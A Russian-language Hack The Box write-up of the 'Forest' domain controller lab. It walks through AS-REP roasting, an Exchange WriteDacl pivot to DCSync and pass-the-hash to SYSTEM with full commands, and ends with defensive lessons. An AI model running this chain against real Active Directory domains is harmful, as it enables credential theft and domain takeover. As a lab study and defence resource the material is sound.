# Forest (HTB)

> Платформа: Hack The Box  
> ОС: Windows  
> Сложность: Легко  
> Результат: root

---

## Цепочка Атаки

```text
Разведка
├── nmap -p- --min-rate=5000 -T4 -Pn -n forest.htb → 53, 88, 135, 139, 389, 445, 464, 593, 636, 3268, 3269, 5985, 9389, 47001, +high RPC ports
├── nmap -sC -sV → Microsoft DNS, Domain: htb.local, Host: FOREST, OS: Windows Server 2016 Standard 14393
└── /etc/hosts: 10.129.95.210 forest.htb htb.local FOREST.htb.local FOREST

Первичный Доступ (Анонимный RPC -> AS-REP Roast -> WinRM)
├── rpcclient -U "" -N 10.129.95.210 -c "enumdomusers" → 31 domain users
├── impacket-GetNPUsers htb.local/ -dc-ip 10.129.95.210 -no-pass -usersfile users.txt -request → $krb5asrep$23$svc-alfresco@HTB.LOCAL
├── john asrep.hash --wordlist=rockyou.txt --format=krb5asrep → <PASSWORD>
└── evil-winrm -i 10.129.95.210 -u svc-alfresco -p <PASSWORD> → shell → user.txt

Аутентифицированное Перечисление
├── whoami /groups → BUILTIN\Account Operators
├── netexec ldap 10.129.95.210 -u svc-alfresco -p <PASSWORD> --bloodhound --collection All
└── BloodHound: SVC-ALFRESCO → ACCOUNT OPERATORS --GenericAll--> EXCHANGE WINDOWS PERMISSIONS --WriteDacl--> HTB.LOCAL → DOMAIN ADMINS

Повышение Привилегий (Exchange WriteDacl -> DCSync -> Pass-the-Hash)
├── net user john <PASSWORD> /add /domain
├── net group "Exchange Windows Permissions" john /add /domain
├── net localgroup "Remote Management Users" john /add
├── . .\powerview.ps1
├── Add-ObjectAcl -PrincipalIdentity john -Credential $cred -Rights DCSync
├── impacket-secretsdump htb.local/john:<PASSWORD>@10.129.95.210 -just-dc-user Administrator → NTLM hash
└── impacket-psexec -hashes <NTLM_HASH> Administrator@10.129.95.210 → SYSTEM → root.txt
```

> [!NOTE]
> Все флаги, пароли, хеши и токены сессий были замаскированы по этическим соображениям.

---

## Брифинг Машины

Windows Server 2016 Standard (14393) Domain Controller (`FOREST`) для домена `htb.local`. Профиль портов (53 DNS, 88 Kerberos, 389/3268 LDAP, 445 SMB, 464 kpasswd, 636 LDAPS, 3269 GC-LDAPS, 5985 WinRM, 9389 AD Web Services) - это классическая подпись Active Directory. SMB signing включён и обязателен - SMB relay невозможен.

Эта машина демонстрирует классическую цепочку атак Active Directory, которая не требует CVE: учётная запись с отключённой Kerberos pre-authentication (`svc-alfresco`) подвергается AS-REP Roast и крекается оффлайн; полученные учётные данные принадлежат `Account Operators`, у которой есть `GenericAll` над Exchange-группой `Exchange Windows Permissions`; эта группа имеет `WriteDacl` на доменном объекте, что позволяет выдать себе права `DCSync`; а `DCSync` извлекает NTLM-хеш `Administrator`. Цепочка целиком построена на мисконфигурациях, распространённых в реальных корпоративных AD-средах с установленным Exchange.

---

## Разведка

### Port Scan

```bash
mkdir -p ~/Desktop/forest/scans; cd ~/Desktop/forest/scans
ports=$(nmap -p- --min-rate=5000 -T4 -Pn -n forest.htb -oG - | awk '/open/{for(i=4;i<=NF;i++){split($i,a,"/"); if(a[2]=="open") printf a[1]","}}' | sed 's/,$//')
nmap -sC -sV -Pn -n -p "$ports" forest.htb -oA scans/detail
```

**Результат (detail):**

```text
PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: ...)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
...
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
| smb-os-discovery:
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   Domain name: htb.local
|   Forest name: htb.local
|_  FQDN: FOREST.htb.local
```

Сводка по портам:

| Порт  | Сервис        | Заметки                                      |
|-------|---------------|----------------------------------------------|
| 53    | DNS           | Simple DNS Plus                              |
| 88    | Kerberos      | Windows Kerberos                             |
| 135   | MSRPC         | Windows RPC                                  |
| 139   | NetBIOS-SSN   | Legacy SMB                                   |
| 389   | LDAP          | Domain: htb.local                            |
| 445   | SMB           | Signing enabled and required                 |
| 464   | kpasswd5      | Kerberos password change                     |
| 593   | RPC over HTTP | ncacn_http                                   |
| 636   | LDAPS         | tcpwrapped                                   |
| 3268  | GC-LDAP       | Global Catalog LDAP                          |
| 3269  | GC-LDAPS      | tcpwrapped                                   |
| 5985  | WinRM         | Microsoft HTTPAPI - remote PowerShell        |
| 9389  | AD Web Svcs   | .NET Message Framing                         |
| 47001 | HTTP          | Microsoft HTTPAPI                             |

Добавляем хост в `/etc/hosts`:

```bash
echo "10.129.95.210    forest.htb htb.local FOREST.htb.local FOREST" | sudo tee -a /etc/hosts
ping -c 2 htb.local
```

**Ключевое наблюдение:** набор портов (53, 88, 389, 445, 464, 636, 3268, 3269, 9389) - канонический признак Domain Controller. LDAP сообщает `Domain: htb.local`, а SMB - `Computer name: FOREST`, `FQDN: FOREST.htb.local`. Порт **5985** (WinRM) открыт - вероятно, это будет первоначальный shell после получения валидных доменных учётных данных.

---

## Первичный Доступ (Анонимный RPC -> AS-REP Roast -> WinRM)

### Анонимное RPC-перечисление

DC допускает анонимный RPC (MS-RPC null session). Перечисляем пользователей домена без учётных данных:

```bash
rpcclient -U "" -N 10.129.95.210 -c "enumdomusers"
```

**Результат:**

```text
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
...
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
```

**Ключевое наблюдение:** учётные записи `SM_*` и `HealthMailbox*` подтверждают, что в домене установлен Microsoft Exchange. Учётная запись `svc-alfresco` выделяется префиксом `svc-` - распространённое соглашение для сервисных учётных записей. У сервисных учёток часто отключена Kerberos pre-authentication, что и является условием для AS-REP Roasting.

### AS-REP Roasting

Сохраняем список пользователей и запрашиваем AS-REP (TGT) для каждого. Только учётные записи с `UF_DONT_REQUIRE_PREAUTH` вернут хеш:

```bash
rpcclient -U "" -N 10.129.95.210 -c "enumdomusers" | grep -oP 'user:\[\K[^\]]+' > users.txt
wc -l users.txt

impacket-GetNPUsers htb.local/ -dc-ip 10.129.95.210 -no-pass -usersfile users.txt -request -format hashcat -outputfile asrep.hash
```

**Результат:**

```text
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
...
[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc-alfresco@HTB.LOCAL:<KRB5ASREP_HASH_PART>$f475...
[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set
```

**Ключевое наблюдение:** только `svc-alfresco` вернул Kerberos AS-REP хеш. Это значит, что у учётной записи отключена Kerberos pre-authentication (флаг `UF_DONT_REQUIRE_PREAUTH`), что позволяет любому запросить TGT, зашифрованный NTLM-хешем учётной записи, и взломать его оффлайн.

### Крек AS-REP хеша

Формат хеша `$krb5asrep$23$...` (etype 23, RC4-HMAC) взламывается John the Ripper или hashcat (режим 18200):

```bash
john asrep.hash --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5asrep
```

**Результат:**

```text
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
<PASSWORD>          ($krb5asrep$23$svc-alfresco@HTB.LOCAL)
1g 0:00:00:01 DONE (2026-10-14 02:50) 0.5917g/s 2417Kp/s 2417Kc/s 2417KC/s s4ls469..s3r2s1
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

Получены учётные данные: `htb.local\svc-alfresco : <PASSWORD>`.

### WinRM foothold

Порт 5985 (WinRM) открыт. Используем `evil-winrm` с полученными учётными данными:

```bash
evil-winrm -i 10.129.95.210 -u svc-alfresco -p '<PASSWORD>'
```

**Результат:**

```text
Evil-WinRM shell v4.1
Info: Establishing connection to remote endpoint
Info: Connection successful
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents>
```

Подтверждаем личность и забираем user flag:

```powershell
whoami
hostname
type C:\Users\svc-alfresco\Desktop\user.txt
```

**Результат:**

```text
htb\svc-alfresco
FOREST
<USER_FLAG>
```

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

---

## Аутентифицированное Перечисление

### Членство в группах

Проверяем, в каких группах состоит `svc-alfresco`, включая вложенные:

```powershell
whoami /groups
```

**Результат (релевантный фрагмент):**

```text
Group Name                                 Type             SID                                           Attributes
========================================== ================ ============================================= ==================================================
Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Account Operators                  Alias            S-1-5-32-548                                  Mandatory group, Enabled by default, Enabled group
HTB\Privileged IT Accounts                 Group            S-1-5-21-3072663084-364016917-1341370565-1149 Mandatory group, Enabled by default, Enabled group
HTB\Service Accounts                       Group            S-1-5-21-3072663084-364016917-1341370565-1148 Mandatory group, Enabled by default, Enabled group
```

**Ключевое наблюдение:** `svc-alfresco` является членом `BUILTIN\Account Operators`. Это привилегированная встроенная группа, члены которой могут создавать и изменять обычных доменных пользователей и группы. Она не может изменять защищённые группы (`Domain Admins`, `Administrators` и т.д.), но может изменять незащищённые группы - чего достаточно для пивота через Exchange-группы.

### Сбор данных BloodHound

Собираем данные Active Directory для анализа графа. Коллектор `bloodhound-python` падает на этом DC, потому что требуется LDAP signing (Python-коллектор использует fallback, который теряет LDAP-контекст после ошибки signing). NetExec, используя другой код-путь, работает:

```bash
netexec ldap 10.129.95.210 -u svc-alfresco -p '<PASSWORD>' --bloodhound --collection All --dns-server 10.129.95.210
```

**Результат:**

```text
LDAP  10.129.95.210  389  FOREST  [*] Windows 10 / Server 2016 Build 14393 (name:FOREST) (domain:htb.local) (signing:None) (channel binding:No TLS cert)
LDAP  10.129.95.210  389  FOREST  [+] htb.local\svc-alfresco:<PASSWORD>
LDAP  10.129.95.210  389  FOREST  Resolved collection methods: rdp, trusts, localadmin, psremote, group, objectprops, session, acl, container, dcom
LDAP  10.129.95.210  389  FOREST  Done in 1M 42S
LDAP  10.129.95.210  389  FOREST  Compressing output into /home/kali/.nxc/logs/FOREST_10.129.95.210_2026-10-14_030646_bloodhound.zip
```

Загружаем полученный zip в BloodHound CE и помечаем `SVC-ALFRESCO@HTB.LOCAL` как **Owned**.

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

### Кратчайший путь к Domain Admins

С помеченным Owned `SVC-ALFRESCO`, запрашиваем кратчайший путь к `DOMAIN ADMINS@HTB.LOCAL`:

**Результат (граф BloodHound):**

```text
SVC-ALFRESCO@HTB.LOCAL
  │ MemberOf
  ▼
SERVICE ACCOUNTS@HTB.LOCAL
  │ MemberOf
  ▼
PRIVILEGED IT ACCOUNTS@HTB.LOCAL
  │ MemberOf
  ▼
ACCOUNT OPERATORS@HTB.LOCAL ──GenericAll──► EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL
                                                   │ WriteDacl
                                                   ▼
                                            HTB.LOCAL (domain object)
                                                   │ Contains
                                                   ▼
                                            USERS@HTB.LOCAL
                                                   │ Contains
                                                   ▼
                                            DOMAIN ADMINS@HTB.LOCAL
```

**Ключевое наблюдение:** путь полностью объясняется тремя фактами:

1. `SVC-ALFRESCO` транзитивно является членом `ACCOUNT OPERATORS`.
2. `ACCOUNT OPERATORS` имеет `GenericAll` над группой `EXCHANGE WINDOWS PERMISSIONS`. `GenericAll` - полный контроль, он позволяет изменять членство группы.
3. `EXCHANGE WINDOWS PERMISSIONS` имеет `WriteDacl` над доменным объектом `HTB.LOCAL`. `WriteDacl` позволяет изменять ACL объекта - то есть выдать кому угодно расширенное право `DCSync`.

Оставшееся ребро (`HTB.LOCAL` -Contains-> `USERS` -Contains-> `DOMAIN ADMINS`) - стандартная иерархия AD; оно показывает, почему `DCSync` на доменном объекте даёт хеши Domain Admin.

Это ровно та мисконфигурация `Exchange Windows Permissions`, которая создаётся по умолчанию при установке Microsoft Exchange (публично отслеживается как **CVE-2019-0724 / PrivExchange**). Наличие `GenericAll` у `Account Operators` над этой группой - это точка пивота.

---

## Эксплуатация

No CVE (misconfiguration) - у учётной записи `svc-alfresco` отключена Kerberos pre-authentication (`UF_DONT_REQUIRE_PREAUTH`), что позволяет любому неаутентифицированному пользователю запросить AS-REP (TGT), зашифрованный NTLM-хешем учётной записи, и взломать его оффлайн.

No CVE (design weakness) - `ACCOUNT OPERATORS` имеет `GenericAll` над `EXCHANGE WINDOWS PERMISSIONS`, которая имеет `WriteDacl` над доменным объектом `HTB.LOCAL`. Оба факта проистекают из установки Exchange по умолчанию и публично задокументированы как **CVE-2019-0724 (PrivExchange)**. Цепочка не требует эксплойт-кода - только легитимные примитивы администрирования AD (`net group`, `Add-ObjectAcl`, `secretsdump`).

---

## Повышение Привилегий (Exchange WriteDacl -> DCSync -> Pass-the-Hash)

### Создание пивот-пользователя

Члены `Account Operators` могут создавать доменных пользователей. Создаём свежего пользователя `john` и добавляем его в две группы, нужные для пивота:

```powershell
net user john <PASSWORD> /add /domain
net group "Exchange Windows Permissions" john /add /domain
net localgroup "Remote Management Users" john /add
```

**Результат:**

```text
The command completed successfully.
The command completed successfully.
The command completed successfully.
```

**Ключевое наблюдение:** вторая команда - это пивот. `svc-alfresco` (через `Account Operators` + `GenericAll`) может добавить `john` в `Exchange Windows Permissions`. Эта группа имеет `WriteDacl` на доменном объекте - значит, `john` теперь наследует эту возможность. `Remote Management Users` добавлена для WinRM-доступа.

### Выдача прав DCSync

Загружаем PowerView на цель и используем его, чтобы выдать `john` расширенное право `DCSync` на доменном объекте:

```powershell
upload /usr/share/powershell-empire/empire/server/data/module_source/situational_awareness/network/powerview.ps1

. .\powerview.ps1

$pass = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('htb\john', $pass)

Add-ObjectAcl -PrincipalIdentity john -Credential $cred -Rights DCSync -Verbose
```

**Результат (релевантные строки):**

```text
Verbose: [Add-DomainObjectAcl] Granting principal CN=john,CN=Users,DC=htb,DC=local 'DCSync' on DC=htb,DC=local
Verbose: [Add-DomainObjectAcl] Granting principal CN=john,CN=Users,DC=htb,DC=local rights GUID '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2' on DC=htb,DC=local
Verbose: [Add-DomainObjectAcl] Granting principal CN=john,CN=Users,DC=htb,DC=local rights GUID '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2' on DC=htb,DC=local
Verbose: [Add-DomainObjectAcl] Granting principal CN=john,CN=Users,DC=htb,DC=local rights GUID '89e95b76-444d-4c62-991a-0facbeda640c' on DC=htb,DC=local
Verbose: [Add-DomainObjectAcl] Error granting principal ... 'DCSync' on CN=Users,DC=htb,DC=local : Exception calling "CommitChanges" with "0" argument(s): "Access is denied."
... (repeats for many child objects)
```

**Ключевое наблюдение:** три строки "Granting" на `DC=htb,DC=local` - самые важные. Они соответствуют:
- `1131f6aa-...` = `DS-Replication-Get-Changes`
- `1131f6ad-...` = `DS-Replication-Get-Changes-All`
- `89e95b76-...` = `DS-Replication-Get-Changes-In-Filtered-Set`

`Add-ObjectAcl` перебирает **все** объекты в домене, и строки `Access is denied` ожидаемы: у `john` (через `Exchange Windows Permissions` / `WriteDacl` на доменном объекте) есть права на изменение ACL только у **корня домена**, но не у дочерних объектов вроде `Domain Admins` или `Administrator`. Грантов на корне домена достаточно для DCSync.

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

### DCSync

С выданными правами `DCSync`, запускаем `impacket-secretsdump` от имени `john`, чтобы извлечь NTLM-хеш `Administrator`:

```bash
impacket-secretsdump 'htb.local/john:<PASSWORD>@10.129.95.210' -just-dc-user Administrator
```

**Результат:**

```text
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:<LM_HASH_EMPTY>:<NTLM_HASH>:::
[*] Kerberos keys grabbed
htb.local\Administrator:aes256-cts-hmac-sha1-96:<AES256_KEY>
htb.local\Administrator:aes128-cts-hmac-sha1-96:<AES128_KEY>
htb.local\Administrator:des-cbc-md5:<DES_KEY>
[*] Cleaning up...
```

**Ключевое наблюдение:** `impacket-secretsdump` использует `DRSUAPI` (Directory Replication Service Remote Protocol), чтобы выдать себя за контроллер домена и вытащить секреты `NTDS.DIT`. Критичное значение - NTLM-хеш `Administrator`: `<NTLM_HASH>`.

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

### Pass-the-Hash

Используем NTLM-хеш с `impacket-psexec` (Pass-the-Hash - plaintext-пароль не нужен):

```bash
impacket-psexec -hashes '<LM_HASH>:<NTLM_HASH>' Administrator@10.129.95.210
```

**Результат:**

```text
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Requesting shares on 10.129.95.210.....
[*] Found writable share ADMIN$
[*] Uploading file WuyqqSXb.exe
[*] Opening SVCManager on 10.129.95.210.....
[*] Creating service CwwI on 10.129.95.210.....
[*] Starting service CwwI.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
<ROOT_FLAG>
```

**Ключевое наблюдение:** `psexec` загружает бинарник сервиса в `ADMIN$`, регистрирует его как Windows-сервис и запускает. Сервис работает как `NT AUTHORITY\SYSTEM` - высший уровень привилегий на машине. NTLM-хеш используется напрямую (Pass-the-Hash); plaintext-пароль `Administrator` так и не был восстановлен.

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

---

## Флаги

| Флаг | Значение    |
|------|-------------|
| User | <USER_FLAG> |
| Root | <ROOT_FLAG> |

---

## Ключевые Выводы

- **AS-REP Roasting требует только одной мисконфигурированной учётной записи.** Сервисная учётка с установленным `UF_DONT_REQUIRE_PREAUTH` позволяет неаутентифицированному атакующему запросить TGT и взломать его оффлайн. Защита проста: не отключайте Kerberos pre-authentication, а если сервис этого требует - используйте длинный, случайно сгенерированный пароль.

- **`Account Operators` - не второстепенная группа.** Её члены могут создавать и изменять обычных пользователей и группы, и этого достаточно для пивота через незащищённые Exchange-группы. Проверяйте любую учётку в `Account Operators` и относитесь к ней как к уровню привилегий, эквивалентному foothold, а не как к низкопривилегированной роли.

- **`Exchange Windows Permissions` имеет `WriteDacl` на домене по умолчанию.** Это широко известная мисконфигурация от установки Exchange (задокументирована как **CVE-2019-0724 / PrivExchange**). Право `WriteDacl` позволяет изменять ACL доменного объекта - и выдать себе `DCSync`. Рекомендация Microsoft - удалить ACE `WriteDacl` у `Exchange Windows Permissions` на доменном объекте после установки Exchange.

- **DCSync - это легитимный репликационный протокол, а не эксплойт.** `impacket-secretsdump` использует `DRSUAPI` (тот же протокол, которым контроллеры домена реплицируются друг с другом). Предотвратить DCSync означает ограничить круг тех, кто имеет права `DS-Replication-Get-Changes` и `DS-Replication-Get-Changes-All` на доменном объекте - по умолчанию это только `Domain Admins`, `Enterprise Admins`, `Administrators` и машинные учётки DC.

- **Pass-the-Hash устраняет необходимость в plaintext-пароле.** Как только NTLM-хеш `Administrator` получен через DCSync, его можно использовать напрямую с `impacket-psexec`, `impacket-wmiexec`, `crackmapexec`/`netexec` или `evil-winrm --hash`. Предотвратить PtH можно только ротацией пароля целевой учётной записи (или полным отключением NTLM-аутентификации).

- **Визуализация BloodHound превращает многошаговую AD-цепочку в одну картинку.** Граф `SVC-ALFRESCO -> ACCOUNT OPERATORS -> EXCHANGE WINDOWS PERMISSIONS -> HTB.LOCAL -> DOMAIN ADMINS` - это весь путь повышения привилегий. Без графа тот же путь потребовал бы ручного перечисления ACL по десяткам объектов.

- **`bloodhound-python` и NetExec используют разные LDAP-код-пути.** Standalone-коллектор `bloodhound-python` упал на этом DC из-за LDAP signing; встроенный коллектор NetExec (`netexec ldap ... --bloodhound`) сработал, потому что иначе обрабатывает negotiation signing/channel-binding. Оба одинаково валидны на OSCP; знайте, что такой failure-mode существует, и будьте готовы переключить коллектор.

- **Никакого CVE, никакого эксплойт-кода.** Вся цепочка использует встроенные примитивы администрирования AD (`net user`, `net group`, `Add-ObjectAcl`, `impacket-secretsdump`). Это современная форма атак на Active Directory: проблема не в повреждении памяти в `lsass.exe` - а в кумулятивном эффекте разрешений, выданных при установке и никогда не проверявшихся.